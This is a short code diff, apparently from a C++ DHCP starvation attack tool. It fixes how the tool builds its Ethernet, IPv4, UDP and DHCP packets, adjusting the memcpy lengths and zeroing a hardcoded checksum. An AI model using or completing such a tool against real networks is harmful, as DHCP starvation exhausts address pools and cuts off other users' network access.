@@ -85,8 +85,8 @@ void DHCPStarvation::prepare_udp_ipv4_hdr() {
     uint8_t src_ip[4] = {0, 0, 0, 0};
     memcpy(&ipv4_pkt.src.addr, src_ip, 4);
 
-    // Checksum never change since it's calculated only on the IPV4 header.
-    ipv4_pkt._chksum = 0xcea9;
+    // Checksum will be calculated later if needed, but for now let's fix the copy steps.
+    ipv4_pkt._chksum = 0;
 
     // Copy IPV4 header to ethernet frame
     memcpy(ethernet_frame + ETH_HDRLEN, &ipv4_pkt, 20 * sizeof(uint8_t));
@@ -155,10 +155,10 @@ void DHCPStarvation::setup() {
     prepare_dhcp_hdr();
 
     //  UDP Header
-    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN, &udp_payload, DHCP_HDRLEN + UDP_HLEN);
+    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN, &udp_payload, UDP_HLEN);
 
-    // Fill payload
-    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN + UDP_HLEN, &dhcp_payload, UDP_HLEN);
+    // Fill DHCP payload
+    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN + UDP_HLEN, &dhcp_payload, DHCP_HDRLEN);
 
     ethernet_frame[285] = 0xff; // Close the packet
 }
